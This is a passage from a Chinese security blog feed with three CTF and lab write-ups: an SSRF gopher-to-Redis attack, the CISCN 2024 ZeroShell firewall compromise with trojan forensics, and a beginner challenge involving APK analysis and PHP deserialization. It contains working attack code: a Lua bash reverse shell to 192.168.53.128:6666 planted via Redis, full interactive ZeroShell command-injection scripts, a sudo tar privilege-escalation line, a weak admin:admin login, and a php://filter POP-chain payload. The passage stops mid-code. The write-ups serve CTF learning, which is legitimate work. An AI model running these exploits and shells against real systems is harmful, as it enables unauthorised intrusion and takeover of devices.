class="headerlink" title="2.5 exp"></a>2.5 exp</h5><p>visit.script 重写内容</p><p>先测试一下能否正常写入lua代码并且执行。</p><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">##LUA_START##</span><br><span class="line">ngx.say(<span class="string">&quot;hello&quot;</span>)</span><br><span class="line">##LUA_END##</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/k1t0111/blog/main/image/20250106202237.png" alt="image.png"><br>可以看出我们已经绕过了这个乱码带来的影响，直接可以包含lua代码并且加载执行。但是目前有个问题，我发现我们的内容长度不可以太长。我始终找不到对应的原因。可能是系统的问题跟打定时任务一样，centos 和ubuntu 不一样。</p><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">##LUA_START##</span><br><span class="line"><span class="built_in">os</span>.<span class="built_in">execute</span>(<span class="string">&quot;/bin/bash -i &gt;&amp;  /dev/tcp/192.168.53.128/6666  0&lt;&amp;&quot;</span>)</span><br><span class="line">##LUA_END##</span><br></pre></td></tr></table></figure><h5 id="2-6-生成payload"><a href="#2-6-生成payload" class="headerlink" title="2.6 生成payload"></a>2.6 生成payload</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib.parse</span><br><span class="line"></span><br><span class="line">protocol = <span class="string">&quot;gopher://&quot;</span></span><br><span class="line">ip = <span class="string">&quot;127.0.0.1&quot;</span></span><br><span class="line">port = <span class="string">&quot;6379&quot;</span></span><br><span class="line">shell = <span class="string">&quot;&quot;&quot;\n\n##LUA_START##</span></span><br><span class="line"><span class="string">os.execute(&quot;/bin/bash -i &gt;&amp; /dev/tcp/192.168.53.128/6666 0&gt;&amp;1&quot;)</span></span><br><span class="line"><span class="string">##LUA_END##\n\n&quot;&quot;&quot;</span></span><br><span class="line">filename = <span class="string">&quot;visit.script&quot;</span></span><br><span class="line">path = <span class="string">&quot;/scripts&quot;</span></span><br><span class="line"><span class="comment"># 这个相当于可以添加密码认证 这边直接输入账号和密码</span></span><br><span class="line">passwd = <span class="string">&quot;&quot;</span></span><br><span class="line">cmd = [<span class="string">&quot;flushall&quot;</span>,</span><br><span class="line">     <span class="string">&quot;set 1 &#123;&#125;&quot;</span>.<span class="built_in">format</span>(shell.replace(<span class="string">&quot; &quot;</span>,<span class="string">&quot;$&#123;IFS&#125;&quot;</span>)),</span><br><span class="line">     <span class="string">&quot;config set dir &#123;&#125;&quot;</span>.<span class="built_in">format</span>(path),</span><br><span class="line">     <span class="string">&quot;config set dbfilename &#123;&#125;&quot;</span>.<span class="built_in">format</span>(filename),</span><br><span class="line">     <span class="string">&quot;save&quot;</span>,</span><br><span class="line">     <span class="string">&quot;quit&quot;</span></span><br><span class="line">    ]</span><br><span class="line"><span class="keyword">if</span> passwd:</span><br><span class="line">    cmd.insert(<span class="number">0</span>,<span class="string">&quot;AUTH &#123;&#125;&quot;</span>.<span class="built_in">format</span>(passwd))</span><br><span class="line">payload = protocol + ip + <span class="string">&quot;:&quot;</span> + port + <span class="string">&quot;/_&quot;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">redis_format</span>(<span class="params">arr</span>):</span><br><span class="line">    CRLF = <span class="string">&quot;\r\n&quot;</span></span><br><span class="line">    redis_arr = arr.split(<span class="string">&quot; &quot;</span>)</span><br><span class="line">    cmd = <span class="string">&quot;&quot;</span></span><br><span class="line">    cmd += <span class="string">&quot;*&quot;</span> + <span class="built_in">str</span>(<span class="built_in">len</span>(redis_arr))</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> redis_arr:</span><br><span class="line">        cmd += CRLF + <span class="string">&quot;$&quot;</span> + <span class="built_in">str</span>(<span class="built_in">len</span>((x.replace(<span class="string">&quot;$&#123;IFS&#125;&quot;</span>,<span class="string">&quot; &quot;</span>)))) + CRLF + x.replace(<span class="string">&quot;$&#123;IFS&#125;&quot;</span>,<span class="string">&quot; &quot;</span>)</span><br><span class="line">    cmd += CRLF</span><br><span class="line">    <span class="keyword">return</span> cmd</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> cmd:</span><br><span class="line">        payload += urllib.parse.quote(redis_format(x))</span><br><span class="line">    <span class="comment"># 最后一个url 编码是因为get传递参数 这个是可选的需要看前端的写法</span></span><br><span class="line">    <span class="comment">#print(payload)</span></span><br><span class="line">    <span class="comment">#print(urllib.parse.quote(payload))</span></span><br><span class="line">    <span class="keyword">import</span> requests</span><br><span class="line">    res=requests.get(<span class="string">&quot;http://192.168.53.128/visit?url=&quot;</span>+urllib.parse.quote(payload)).text</span><br><span class="line">    <span class="built_in">print</span>(res)</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/k1t0111/blog/main/image/20250106214402.png" alt="image.png"></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>外联木马分析-ciscn</title>
      <link href="/2024/12/26/%E5%A4%96%E8%81%94%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90-ciscn/"/>
      <url>/2024/12/26/%E5%A4%96%E8%81%94%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90-ciscn/</url>
      
        <content type="html"><![CDATA[<p><a href="https://github.com/CTF-Archives/2024-ccbciscn">https://github.com/CTF-Archives/2024-ccbciscn</a><br><a href="https://bili33.top/posts/CTF-CISCN2024-Preliminary-round-Writeup/">https://bili33.top/posts/CTF-CISCN2024-Preliminary-round-Writeup/</a></p><p>靶机来自2024年长城杯ciscn ，个人比较感兴趣，因此继续做一遍</p><p>小路是一名实习生，接替公司前任网管的工作，一天发现公司网络出口出现了异常的通信，现需要通过回溯出口流量对异常点位(防火墙)进行定位，并确定异常的设备。然后进行深度取证检查（需要获取root权限）。现在需要你从网络攻击数据包中找出漏洞攻击的会话，分析会话编写exp或数据包重放获取防火墙设备管理员权限，查找防火墙设备上安装的木马，然后分析木马外联地址和通信密钥以及木马启动项位置。</p><h4 id="1-zeroshell"><a href="#1-zeroshell" class="headerlink" title="1 zeroshell"></a>1 zeroshell</h4><p><img src="https://raw.githubusercontent.com/k1t0111/blog/main/image/20241226115950.png" alt="image.png"></p><p>背景就是一台防火墙设备存在相关rce漏洞，因此被注入了相关外联木马。</p><h5 id="1-1-攻击流量"><a href="#1-1-攻击流量" class="headerlink" title="1.1 攻击流量"></a>1.1 攻击流量</h5><p>其实就是利用了自带的后门进行命令执行。然后分析流量明文找到flag<br><img src="https://raw.githubusercontent.com/k1t0111/blog/main/image/20241226132002.png" alt="image.png"></p><p>因此我们仿照着攻击路径，针对防火墙进行攻击，拿到对应的权限</p><h5 id="1-2-rce"><a href="#1-2-rce" class="headerlink" title="1.2   rce"></a>1.2   rce</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> optparse</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">parser = optparse.OptionParser()</span><br><span class="line">parser.add_option(<span class="string">&#x27;-u&#x27;</span>, <span class="string">&#x27;--url&#x27;</span>, action=<span class="string">&quot;store&quot;</span>, dest=<span class="string">&quot;url&quot;</span>, <span class="built_in">help</span>=<span class="string">&#x27;Base target uri (ex. http://target-uri/)&#x27;</span>)</span><br><span class="line"></span><br><span class="line">options, args = parser.parse_args()</span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> options.url:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;[+] Specify an url target&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;[+] Example usage: exploit.py -u http://target-uri/&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;[+] Example help usage: exploit.py -h&#x27;</span>)</span><br><span class="line">    exit()</span><br><span class="line"></span><br><span class="line">uri_zeroshell = options.url</span><br><span class="line">session = requests.Session()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">command</span>():</span><br><span class="line"><span class="comment">#  进行一个漏洞是否存在的探测</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        check = session.get(uri_zeroshell + <span class="string">&quot;/cgi-bin/kerbynet?Action=x509view&amp;Section=NoAuthREQ&amp;User=&amp;x509type=&#x27;%0Aid%0A&#x27;&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> check.status_code == <span class="number">200</span>:</span><br><span class="line">            flag = <span class="literal">True</span></span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;[+] ZeroShell 3.9.0 Remote Command Execution&#x27;</span>)</span><br><span class="line">            time.sleep(<span class="number">1</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;[+] Success connect to target&#x27;</span>)</span><br><span class="line">            time.sleep(<span class="number">1</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;[+] Trying to execute command in ZeroShell OS...\n&#x27;</span>)</span><br><span class="line">            time.sleep(<span class="number">1</span>)</span><br><span class="line">            check.raise_for_status()  </span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> flag:</span><br><span class="line">            cmd = raw_input(<span class="string">&quot;$ &quot;</span>)</span><br><span class="line">            <span class="comment"># 不停输入命令 进行命令注入点命令执行 </span></span><br><span class="line">            payload = <span class="string">&quot;/cgi-bin/kerbynet?Action=x509view&amp;Section=NoAuthREQ&amp;User=&amp;x509type=&#x27;%0A&quot;</span> + cmd + <span class="string">&quot;%0A&#x27;&quot;</span></span><br><span class="line">            uri_vuln = uri_zeroshell + payload</span><br><span class="line">            burp0_headers = &#123;<span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0&quot;</span>, <span class="string">&quot;Accept&quot;</span>: <span class="string">&quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8&quot;</span>, <span class="string">&quot;Accept-Language&quot;</span>: <span class="string">&quot;en-US,en;q=0.5&quot;</span>, <span class="string">&quot;Accept-Encoding&quot;</span>: <span class="string">&quot;gzip, deflate&quot;</span>, <span class="string">&quot;Connection&quot;</span>: <span class="string">&quot;close&quot;</span>, <span class="string">&quot;Upgrade-Insecure-Requests&quot;</span>: <span class="string">&quot;1&quot;</span>&#125;</span><br><span class="line">            res = session.get(uri_vuln, headers=burp0_headers, verify=<span class="literal">False</span>)</span><br><span class="line">            <span class="built_in">print</span>(res.text[:res.text.rindex(<span class="string">&quot;&lt;html&gt;&quot;</span>) / <span class="number">2</span>])</span><br><span class="line"></span><br><span class="line">    <span class="keyword">except</span> requests.exceptions.ConnectionError <span class="keyword">as</span> err:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;[x] Failed to Connect in: &#x27;</span>+uri_zeroshell+<span class="string">&#x27; &#x27;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;[x] This host seems to be Down&#x27;</span>)</span><br><span class="line">        exit()</span><br><span class="line">    <span class="keyword">except</span> requests.exceptions.HTTPError <span class="keyword">as</span> conn:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;[x] Failed to execute command in: &#x27;</span>+uri_zeroshell+<span class="string">&#x27; &#x27;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;[x] This host does not appear to be a ZeroShell&#x27;</span>)</span><br><span class="line">        exit()</span><br><span class="line"></span><br><span class="line">command()</span><br></pre></td></tr></table></figure><p>提取 payload 其实就是一个url访问<br>&#x2F;cgi-bin&#x2F;kerbynet?Action&#x3D;x509view&amp;Section&#x3D;NoAuthREQ&amp;User&#x3D;&amp;x509type&#x3D;’%0Asudo -l%0A’<br>并且还有一个提权可以从apache提权到root</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/etc/sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=id</span><br></pre></td></tr></table></figure><p>利用这个提权语句拿到root权限<br><img src="https://raw.githubusercontent.com/k1t0111/blog/main/image/20241226122256.png" alt="image.png"></p><p><img src="https://raw.githubusercontent.com/k1t0111/blog/main/image/20241226122351.png" alt="image.png"></p><p>由于一些上马的操作无法完成，我自己写了一个提权执行命令脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="comment"># cmd 执行相关提权命令</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cmd</span>():</span><br><span class="line">    Url=<span class="built_in">input</span>(<span class="string">&quot;[+]Input Url&quot;</span>)</span><br><span class="line">    payload1=<span class="string">&quot;/cgi-bin/kerbynet?Action=x509view&amp;Section=NoAuthREQ&amp;User=&amp;x509type=&#x27;%0A/etc/sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=&quot;</span></span><br><span class="line">    payload2=<span class="string">&quot;%0A&#x27;&quot;</span></span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>):</span><br><span class="line">        cmd1=<span class="built_in">input</span>(<span class="string">&quot;cmd$:&quot;</span>)</span><br><span class="line">        payload=Url+payload1+<span class="string">&quot;\&quot;&quot;</span>+cmd1+<span class="string">&quot;\&quot;&quot;</span>+payload2</span><br><span class="line">        res=requests.get(payload)</span><br><span class="line">        <span class="built_in">print</span>(res.text[<span class="number">0</span>:res.text.index(<span class="string">&quot;&lt;html&gt;&quot;</span>)//<span class="number">2</span>])</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    cmd()</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/k1t0111/blog/main/image/20241226125849.png" alt="image.png"></p><h5 id="1-3-外联地址"><a href="#1-3-外联地址" class="headerlink" title="1.3  外联地址"></a>1.3  外联地址</h5><p>找出受控机防火墙设备中驻留木马的外联域名或IP地址，结果提交形式：flag{xxxx}，如flag{<a href="http://www.abc.com/">www.abc.com</a>} </p><p>我们可以看一下我们的进程的连接情况，端口开放情况。相对应的就有可能外联驻留木马的一些痕迹。</p><p><img src="https://raw.githubusercontent.com/k1t0111/blog/main/image/20241226134917.png" alt="image.png"></p><h5 id="1-4-木马位置"><a href="#1-4-木马位置" class="headerlink" title="1.4 木马位置"></a>1.4 木马位置</h5><p>请写出木马进程执行的本体文件的名称，结果提交形式：flag{xxxxx}，仅写文件名不加路径</p><p>这个属实是没写出来，我的想法是利用ip 找到对应进程的pid 但是很抽象。</p><p><img src="https://raw.githubusercontent.com/k1t0111/blog/main/image/20241226160921.png" alt="image.png"></p><p>我们无法发现对应的pid 因为连接已经断掉了。因此只能去取证分析因为有内存和磁盘<br>我们利用Diskgenius 挂载。</p><p><img src="https://raw.githubusercontent.com/k1t0111/blog/main/image/20241226164355.png" alt="image.png"><br>目前已经知道外联木马的外部ip地址。查看磁盘中的文件关联.直接根据外联的ip去搜索对应的文件</p><p><img src="https://raw.githubusercontent.com/k1t0111/blog/main/image/20241226172447.png" alt="image.png"></p><p>可以看到直接其实就是nginx</p><h5 id="1-5-木马通信密钥"><a href="#1-5-木马通信密钥" class="headerlink" title="1.5 木马通信密钥"></a>1.5 木马通信密钥</h5><p>ida分析 nginx  怎么说呢这我也不会。 直接分析吧。搜素对应的公网ip 总能看到一些东西</p><p><img src="https://raw.githubusercontent.com/k1t0111/blog/main/image/20241226174227.png" alt="image.png"></p><h5 id="1-6-木马启动项"><a href="#1-6-木马启动项" class="headerlink" title="1.6  木马启动项"></a>1.6  木马启动项</h5><p>直接搜索木马名字看看谁内部包含<br> <img src="https://raw.githubusercontent.com/k1t0111/blog/main/image/20241226174513.png" alt="image.png"><br>找到启动项  </p>]]></content>
      
      
      <categories>
          
          <category> 安全运营 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 应急响应 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>新星赛</title>
      <link href="/2024/12/25/%E6%96%B0%E6%98%9F%E8%B5%9B/"/>
      <url>/2024/12/25/%E6%96%B0%E6%98%9F%E8%B5%9B/</url>
      
        <content type="html"><![CDATA[<p>本题根据真实渗透场景来出的，一般来讲这也是一种渗透测试的重要思路。最后的进入后台你可以理解为有一个模板文件的修改，考察代码审计。</p><h4 id="apk分析"><a href="#apk分析" class="headerlink" title="apk分析"></a>apk分析</h4><p><img src="https://raw.githubusercontent.com/k1t0111/blog/main/image/20241126104823.png" alt="image.png"><br>进入官网，发现有一些最新的资讯和评论，关于一个app。<br><img src="https://raw.githubusercontent.com/k1t0111/blog/main/image/20241126104907.png" alt="image.png"></p><p>找到对应的下载地址。一般来讲apk的分析是我们找到一些web页面的重要手段。很可能我们能够找到app的后台地址。因此找到这个apk然后下载。<br><img src="https://raw.githubusercontent.com/k1t0111/blog/main/image/20241126105035.png" alt="image.png"></p><p>分析apk ，这里考虑到很多都是ctf新生，因此没有利用一些分析工具去找url而是利用了更加直接的方式。两种方式找到对应的后台地址url</p><h5 id="方式一"><a href="#方式一" class="headerlink" title="方式一"></a><strong>方式一</strong></h5><p>逆向手应该都有安卓模拟器，直接apk安装到模拟器上。或者直接安装到手机上。启动app就直接有了web后台地址。<br><img src="https://raw.githubusercontent.com/k1t0111/blog/main/image/Screenshot_20241126_110447.png" alt="Screenshot_20241126_110447.png"></p><h5 id="方式二"><a href="#方式二" class="headerlink" title="方式二"></a><strong>方式二</strong></h5><p>misc 手应该需要会，apk本质也是个压缩包。把apk后缀改成zip然后解压。直接搜flag<br>但是有一点要注意，app打包之后xml文件是二进制。因此也考察了选手对于grep的使用情况</p><p><img src="https://raw.githubusercontent.com/k1t0111/blog/main/image/20241126105655.png" alt="image.png"></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">grep -a -r &quot;flag&quot; . </span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"> 搜索二进制 递归搜索</span> </span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/k1t0111/blog/main/image/20241126105735.png" alt="image.png"><br><img src="https://raw.githubusercontent.com/k1t0111/blog/main/image/20241126105755.png" alt="image.png"><br>访问后台地址</p><h4 id="后台admin"><a href="#后台admin" class="headerlink" title="后台admin"></a>后台admin</h4><p>终于找到后台地址，弱口令进去</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin:admin</span><br></pre></td></tr></table></figure><h4 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>); <span class="comment">//关闭错误报告</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">K1T0</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$file</span> = <span class="string">&#x27;FLAG.php&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$test</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$file</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;file = <span class="variable">$file</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">test</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$this</span>-&gt;test);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="variable language_">$this</span>-&gt;file)) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/filter/&#x27;</span>, <span class="variable">$this</span>-&gt;file)) &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;file;</span><br><span class="line">                <span class="title function_ invoke__">printf</span>(<span class="string">&quot;再试试&quot;</span>);</span><br><span class="line">                <span class="keyword">exit</span>();</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">include</span>(<span class="variable language_">$this</span>-&gt;file);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;successful guy!!!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">kkk</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">eval</span> (<span class="variable language_">$this</span>-&gt;test);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">APT</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$eth0</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$eth1</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;eth0;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>])) &#123;</span><br><span class="line">    <span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">base64_decode</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]);</span><br><span class="line">    <span class="title function_ invoke__">unserialize</span>(<span class="variable">$file</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>其实这个序列化很简单链子是 APT-&gt; K1T0 触发魔术方法 toString</p><h5 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>); <span class="comment">//关闭错误报告</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">K1T0</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$file</span> = <span class="string">&#x27;php://filter/read=convert.base64-encode/resource=/flag&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$test</span>;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="variable language_">$this</span>-&gt;file)) &#123;</span><br><span class="line">                <span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>( <span class="string">&quot;filter&quot;</span>,<span class="variable">$this</span>-&gt;file)) &#123;</span><br><span class="line">                    <span class="title function_ invoke__">printf</span>(<span class="string">&quot;再试试&quot;</span>);</span><br><span class="line">                    <span class="keyword">exit</span>();</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">else</span>&#123;</span><br><span class="line">                    <span class="keyword">include</span>(<span class="variable language_">$this</span>-&gt;file);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;successful guy!!!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">APT</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$eth0</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$eth1</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title function_ invoke__">APT</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;eth0=<span class="keyword">new</span>  <span class="title class_">K1T0</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ 